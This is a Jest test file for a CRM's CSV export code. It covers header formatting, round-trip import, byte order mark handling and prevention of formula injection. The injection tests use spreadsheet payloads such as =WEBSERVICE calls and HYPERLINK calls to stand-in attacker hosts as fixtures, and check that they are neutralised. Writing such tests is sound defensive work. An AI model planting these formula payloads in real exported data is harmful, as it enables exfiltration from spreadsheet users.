import { type FieldMetadata } from '@/object-record/record-field/ui/types/FieldMetadata';
import { type ColumnDefinition } from '@/object-record/record-table/types/ColumnDefinition';
import { CSV_INJECTION_PREVENTION_ZWJ } from '@/spreadsheet-import/constants/CsvInjectionPreventionZwj';
import { mapWorkbook } from '@/spreadsheet-import/utils/mapWorkbook';

import {
  csvDownloader,
  displayedExportProgress,
  generateCsv,
} from '@/object-record/record-index/export/hooks/useRecordIndexExportRecords';
import { saveAs } from 'file-saver';
import { read } from 'xlsx-ugnis';
import { FieldMetadataType, RelationType } from '~/generated-metadata/graphql';

jest.mock('file-saver', () => ({
  saveAs: jest.fn(),
}));

jest.useFakeTimers();

describe('generateCsv', () => {
  it('generates a csv with formatted headers', async () => {
    const columns: Pick<
      ColumnDefinition<FieldMetadata>,
      'size' | 'label' | 'type' | 'metadata'
    >[] = [
      {
        label: 'Foo',
        size: 100,
        type: FieldMetadataType.TEXT,
        metadata: { fieldName: 'foo' },
      },
      {
        label: 'Empty',
        size: 100,
        type: FieldMetadataType.TEXT,
        metadata: { fieldName: 'empty' },
      },
      {
        label: 'Nested link field',
        size: 150,
        type: FieldMetadataType.LINKS,
        metadata: { fieldName: 'nestedLinkField' },
      },
      {
        label: 'Relation',
        size: 120,
        type: FieldMetadataType.RELATION,
        metadata: {
          fieldName: 'relation',
          relationType: RelationType.MANY_TO_ONE,
        },
      },
    ];
    const rows = [
      {
        id: '1',
        bar: 'another field',
        empty: null,
        foo: 'some field',
        nestedLinkField: {
          __typename: 'Links',
          primaryLinkLabel: '',
          primaryLinkUrl: 'https://www.test.com',
          secondaryLinks:
            'secondary link 1: https://www.test.com\nsecondary link 2: https://www.test.com',
        },
        relation: 'a relation',
        relationId: 'relation-uuid',
      },
    ];
    const csv = generateCsv({ columns, rows });
    expect(csv).toEqual(
      [
        '\uFEFFsep=,',
        'Id,Foo,Empty,Nested link field / Link Label,Nested link field / Link URL,Nested link field / Secondary Links,Relation,Relation / ID',
        '1,some field,,,https://www.test.com,"secondary link 1: https://www.test.com\nsecondary link 2: https://www.test.com",a relation,relation-uuid',
      ].join('\r\n'),
    );
  });

  it('writes Excel-readable CSV that the importer maps back without losing text or IDs', () => {
    const columns: Pick<
      ColumnDefinition<FieldMetadata>,
      'size' | 'label' | 'type' | 'metadata'
    >[] = [
      {
        label: 'Name',
        size: 100,
        type: FieldMetadataType.TEXT,
        metadata: { fieldName: 'name' },
      },
      {
        label: 'Notes',
        size: 180,
        type: FieldMetadataType.TEXT,
        metadata: { fieldName: 'notes' },
      },
      {
        label: 'Company',
        size: 120,
        type: FieldMetadataType.RELATION,
        metadata: {
          fieldName: 'company',
          relationType: RelationType.MANY_TO_ONE,
        },
      },
      {
        label: 'Annual Revenue',
        size: 150,
        type: FieldMetadataType.CURRENCY,
        metadata: { fieldName: 'annualRevenue' },
      },
      {
        label: 'Headquarters',
        size: 180,
        type: FieldMetadataType.ADDRESS,
        metadata: { fieldName: 'headquarters' },
      },
      {
        label: 'Contact Name',
        size: 150,
        type: FieldMetadataType.FULL_NAME,
        metadata: { fieldName: 'contactName' },
      },
      {
        label: 'Created On',
        size: 120,
        type: FieldMetadataType.DATE,
        metadata: { fieldName: 'createdOn' },
      },
      {
        label: 'Last Update',
        size: 150,
        type: FieldMetadataType.DATE_TIME,
        metadata: { fieldName: 'lastUpdate' },
      },
    ];
    const csv = generateCsv({
      columns,
      rows: [
        {
          id: '8ac078c6-532f-4a5e-af5f-fcf76f7c2ed4',
          name: '00123',
          notes: 'Crème, Inc. said "hello"\nSecond line',
          company: 'Acme Corporation',
          companyId: '6fa459ea-ee8a-3ca4-894e-db77e160355e',
          annualRevenue: { amountMicros: 1234.56, currencyCode: 'EUR' },
          headquarters: {
            addressStreet1: '1 rue de la Paix',
            addressStreet2: 'Apt 2',
            addressCity: 'Tunis',
            addressState: 'Tunis',
            addressPostcode: '1000',
            addressCountry: 'Tunisia',
            addressLat: 36.8,
            addressLng: 10.18,
          },
          contactName: { firstName: 'Zoé', lastName: 'Ben Salem' },
          createdOn: '2025-02-03',
          lastUpdate: '2025-02-03 04:05:06 UTC',
        },
      ],
    });
    const workbook = read(new TextEncoder().encode(csv), {
      type: 'array',
      codepage: 65001,
      cellDates: true,
      dateNF: 'yyyy-mm-dd',
      raw: true,
      dense: true,
    });

    expect(mapWorkbook(workbook)).toEqual([
      [
        'Id',
        'Name',
        'Notes',
        'Company',
        'Company / ID',
        'Annual Revenue / Amount',
        'Annual Revenue / Currency',
        'Headquarters / Address 1',
        'Headquarters / Address 2',
        'Headquarters / City',
        'Headquarters / State',
        'Headquarters / Country',
        'Headquarters / Post Code',
        'Headquarters / Latitude',
        'Headquarters / Longitude',
        'Contact Name / First Name',
        'Contact Name / Last Name',
        'Created On',
        'Last Update',
      ],
      [
        '8ac078c6-532f-4a5e-af5f-fcf76f7c2ed4',
        '00123',
        'Crème, Inc. said "hello"\nSecond line',
        'Acme Corporation',
        '6fa459ea-ee8a-3ca4-894e-db77e160355e',
        '1234.56',
        'EUR',
        '1 rue de la Paix',
        'Apt 2',
        'Tunis',
        'Tunis',
        'Tunisia',
        '1000',
        '36.8',
        '10.18',
        'Zoé',
        'Ben Salem',
        '2025-02-03',
        '2025-02-03 04:05:06 UTC',
      ],
    ]);
  });

  it('generates csv with multi-select and array values as readable lines', () => {
    const columns: Pick<
      ColumnDefinition<FieldMetadata>,
      'size' | 'label' | 'type' | 'metadata'
    >[] = [
      {
        label: 'Name',
        size: 100,
        type: FieldMetadataType.TEXT,
        metadata: { fieldName: 'name' },
      },
      {
        label: 'Tags',
        size: 120,
        type: FieldMetadataType.MULTI_SELECT,
        metadata: { fieldName: 'tags' },
      },
      {
        label: 'Skills',
        size: 150,
        type: FieldMetadataType.ARRAY,
        metadata: { fieldName: 'skills' },
      },
    ];

    const rows = [
      {
        id: '1',
        name: 'John Doe',
        tags: 'DISTRIBUTOR\nIMPLEMENTATION',
        skills: 'JavaScript\nTypeScript\nReact',
      },
      {
        id: '2',
        name: 'Jane Smith',
        tags: 'PARTNER',
        skills: 'Python\nDjango',
      },
    ];

    const csv = generateCsv({ columns, rows });

    expect(csv).toContain('"DISTRIBUTOR\nIMPLEMENTATION"');
    expect(csv).toContain('"JavaScript\nTypeScript\nReact"');
    expect(csv).toContain('PARTNER');
    expect(csv).toContain('"Python\nDjango"');

    expect(csv).toContain('Id,Name,Tags,Skills');
    expect(csv).toContain('1,John Doe');
    expect(csv).toContain('2,Jane Smith');
  });

  it('generates csv with empty multi-select and array fields as empty cells', () => {
    const columns: Pick<
      ColumnDefinition<FieldMetadata>,
      'size' | 'label' | 'type' | 'metadata'
    >[] = [
      {
        label: 'Name',
        size: 100,
        type: FieldMetadataType.TEXT,
        metadata: { fieldName: 'name' },
      },
      {
        label: 'Tags',
        size: 120,
        type: FieldMetadataType.MULTI_SELECT,
        metadata: { fieldName: 'tags' },
      },
      {
        label: 'Skills',
        size: 150,
        type: FieldMetadataType.ARRAY,
        metadata: { fieldName: 'skills' },
      },
    ];

    const rows = [
      {
        id: '1',
        name: 'John Doe',
        tags: '',
        skills: '',
      },
    ];

    const csv = generateCsv({ columns, rows });

    expect(csv).toContain('Id,Name,Tags,Skills');
    expect(csv).toContain('1,John Doe,,');
  });

  describe('CSV Injection Prevention with ZWJ', () => {
    it('prevents formula injection with equals sign using ZWJ prefix', () => {
      const columns: Pick<
        ColumnDefinition<FieldMetadata>,
        'size' | 'label' | 'type' | 'metadata'
      >[] = [
        {
          label: 'Name',
          size: 100,
          type: FieldMetadataType.TEXT,
          metadata: { fieldName: 'name' },
        },
        {
          label: 'Formula',
          size: 100,
          type: FieldMetadataType.TEXT,
          metadata: { fieldName: 'formula' },
        },
      ];

      const rows = [
        {
          id: '1',
          name: 'Test User',
          formula: '=WEBSERVICE("http://attacker.com")',
        },
      ];

      const csv = generateCsv({ columns, rows });

      expect(csv).toContain(
        `${CSV_INJECTION_PREVENTION_ZWJ}=WEBSERVICE(""http://attacker.com"")`,
      );
      expect(csv).not.toContain(
        '1,Test User,=WEBSERVICE("http://attacker.com")',
      );
      expect(csv).toContain(
        `1,Test User,"${CSV_INJECTION_PREVENTION_ZWJ}=WEBSERVICE(""http://attacker.com"")"`,
      );
    });

    it('prevents formula injection with plus sign using ZWJ prefix', () => {
      const columns: Pick<
        ColumnDefinition<FieldMetadata>,
        'size' | 'label' | 'type' | 'metadata'
      >[] = [
        {
          label: 'Calculation',
          size: 100,
          type: FieldMetadataType.TEXT,
          metadata: { fieldName: 'calculation' },
        },
      ];

      const rows = [
        {
          id: '1',
          calculation: '+1+1',
        },
      ];

      const csv = generateCsv({ columns, rows });

      expect(csv).toContain(`${CSV_INJECTION_PREVENTION_ZWJ}+1+1`);
      expect(csv).not.toContain('1,+1+1');
    });

    it('prevents formula injection with minus sign using ZWJ prefix', () => {
      const columns: Pick<
        ColumnDefinition<FieldMetadata>,
        'size' | 'label' | 'type' | 'metadata'
      >[] = [
        {
          label: 'Calculation',
          size: 100,
          type: FieldMetadataType.TEXT,
          metadata: { fieldName: 'calculation' },
        },
      ];

      const rows = [
        {
          id: '1',
          calculation: '-1+1',
        },
      ];

      const csv = generateCsv({ columns, rows });

      expect(csv).toContain(`${CSV_INJECTION_PREVENTION_ZWJ}-1+1`);
      expect(csv).not.toContain('1,-1+1');
    });

    it('prevents formula injection with at symbol using ZWJ prefix', () => {
      const columns: Pick<
        ColumnDefinition<FieldMetadata>,
        'size' | 'label' | 'type' | 'metadata'
      >[] = [
        {
          label: 'Reference',
          size: 100,
          type: FieldMetadataType.TEXT,
          metadata: { fieldName: 'reference' },
        },
      ];

      const rows = [
        {
          id: '1',
          reference: '@SUM(1,1)',
        },
      ];

      const csv = generateCsv({ columns, rows });

      expect(csv).toContain(`${CSV_INJECTION_PREVENTION_ZWJ}@SUM(1,1)`);
      expect(csv).not.toContain('1,@SUM(1,1)');
    });

    it('prevents formula injection with tab character using ZWJ prefix', () => {
      const columns: Pick<
        ColumnDefinition<FieldMetadata>,
        'size' | 'label' | 'type' | 'metadata'
      >[] = [
        {
          label: 'Data',
          size: 100,
          type: FieldMetadataType.TEXT,
          metadata: { fieldName: 'data' },
        },
      ];

      const rows = [
        {
          id: '1',
          data: '\t=WEBSERVICE("http://attacker.com")',
        },
      ];

      const csv = generateCsv({ columns, rows });

      expect(csv).toContain(
        `${CSV_INJECTION_PREVENTION_ZWJ}\t=WEBSERVICE(""http://attacker.com"")`,
      );
      expect(csv).not.toContain('1,\t=WEBSERVICE("http://attacker.com")');
    });

    it('prevents formula injection with carriage return using ZWJ prefix', () => {
      const columns: Pick<
        ColumnDefinition<FieldMetadata>,
        'size' | 'label' | 'type' | 'metadata'
      >[] = [
        {
          label: 'Data',
          size: 100,
          type: FieldMetadataType.TEXT,
          metadata: { fieldName: 'data' },
        },
      ];

      const rows = [
        {
          id: '1',
          data: '\r=WEBSERVICE("http://attacker.com")',
        },
      ];

      const csv = generateCsv({ columns, rows });

      expect(csv).toContain(
        `${CSV_INJECTION_PREVENTION_ZWJ}\r=WEBSERVICE(""http://attacker.com"")`,
      );
      expect(csv).not.toContain('1,\r=WEBSERVICE("http://attacker.com")');
    });

    it('handles multiple injection attempts in different fields with ZWJ prefix', () => {
      const columns: Pick<
        ColumnDefinition<FieldMetadata>,
        'size' | 'label' | 'type' | 'metadata'
      >[] = [
        {
          label: 'Field1',
          size: 100,
          type: FieldMetadataType.TEXT,
          metadata: { fieldName: 'field1' },
        },
        {
          label: 'Field2',
          size: 100,
          type: FieldMetadataType.TEXT,
          metadata: { fieldName: 'field2' },
        },
        {
          label: 'Field3',
          size: 100,
          type: FieldMetadataType.TEXT,
          metadata: { fieldName: 'field3' },
        },
      ];

      const rows = [
        {
          id: '1',
          field1: '=WEBSERVICE("http://evil.com")',
          field2: '+SUM(A1:A10)',
          field3: '-HYPERLINK("http://malicious.com")',
        },
      ];

      const csv = generateCsv({ columns, rows });

      expect(csv).toContain(
        `${CSV_INJECTION_PREVENTION_ZWJ}=WEBSERVICE(""http://evil.com"")`,
      );
      expect(csv).toContain(`${CSV_INJECTION_PREVENTION_ZWJ}+SUM(A1:A10)`);
      expect(csv).toContain(
        `${CSV_INJECTION_PREVENTION_ZWJ}-HYPERLINK(""http://malicious.com"")`,
      );

      expect(csv).not.toContain('1,=WEBSERVICE("http://evil.com")');
      expect(csv).not.toContain(',+SUM(A1:A10)');
      expect(csv).not.toContain(',-HYPERLINK("http://malicious.com")');
    });

    it('preserves legitimate content that does not start with dangerous characters', () => {
      const columns: Pick<
        ColumnDefinition<FieldMetadata>,
        'size' | 'label' | 'type' | 'metadata'
      >[] = [
        {
          label: 'Name',
          size: 100,
          type: FieldMetadataType.TEXT,
          metadata: { fieldName: 'name' },
        },
        {
          label: 'Email',
          size: 120,
          type: FieldMetadataType.TEXT,
          metadata: { fieldName: 'email' },
        },
        {
          label: 'Description',
          size: 200,
          type: FieldMetadataType.TEXT,
          metadata: { fieldName: 'description' },
        },
      ];

      const rows = [
        {
          id: '1',
          name: 'John Doe',
          email: 'john@example.com',
          description:
            'This is a normal description with = and + symbols in the middle',
        },
      ];

      const csv = generateCsv({ columns, rows });

      expect(csv).toContain('John Doe');
      expect(csv).toContain('john@example.com');
      expect(csv).toContain(
        'This is a normal description with = and + symbols in the middle',
      );
    });
  });
});

describe('csvDownloader', () => {
  const mockSaveAs = saveAs as jest.MockedFunction<typeof saveAs>;

  beforeEach(() => {
    mockSaveAs.mockClear();
  });

  const readBlob = async (blob: Blob): Promise<ArrayBuffer> =>
    new Promise<ArrayBuffer>((resolve, reject) => {
      const reader = new FileReader();
      reader.onload = () => resolve(reader.result as ArrayBuffer);
      reader.onerror = reject;
      reader.readAsArrayBuffer(blob);
    });

  const columns: Pick<
    ColumnDefinition<FieldMetadata>,
    'size' | 'label' | 'type' | 'metadata'
  >[] = [
    {
      label: 'Name',
      size: 100,
      type: FieldMetadataType.TEXT,
      metadata: { fieldName: 'name' },
    },
  ];

  it('prepends UTF-8 BOM (EF BB BF) as first three bytes', async () => {
    csvDownloader('export.csv', {
      columns,
      rows: [{ id: '1', name: 'test' }],
    });

    const blob = mockSaveAs.mock.calls[0][0] as Blob;
    const bytes = new Uint8Array(await readBlob(blob));

    expect(bytes[0]).toBe(0xef);
    expect(bytes[1]).toBe(0xbb);
    expect(bytes[2]).toBe(0xbf);
  });

  it.each([
    ['Arabic', 'مرحبا'],
    ['Chinese', '你好'],
    ['Japanese', 'こんにちは'],
    ['Korean', '안녕하세요'],
  ])('preserves %s characters in exported content', async (_, name) => {
    csvDownloader('export.csv', { columns, rows: [{ id: '1', name }] });

    const blob = mockSaveAs.mock.calls[0][0] as Blob;
    const text = Buffer.from(await readBlob(blob)).toString('utf-8');

    expect(text).toContain(name);
  });
});

describe('displayedExportProgress', () => {
  it.each([
    [undefined, undefined, 'percentage', 'Export'],
    [20, 50, 'percentage', 'Export (40%)'],
    [0, 100, 'number', 'Export (0)'],
    [10, 10, 'percentage', 'Export (100%)'],
    [10, 10, 'number', 'Export (10)'],
    [7, 9, 'percentage', 'Export (78%)'],
  ])(
    'displays the export progress',
    (exportedRecordCount, totalRecordCount, displayType, expected) => {
      expect(
        displayedExportProgress({
          exportedRecordCount,
          totalRecordCount,
          displayType: displayType as 'percentage' | 'number',
        }),
      ).toEqual(expected);
    },
  );
});
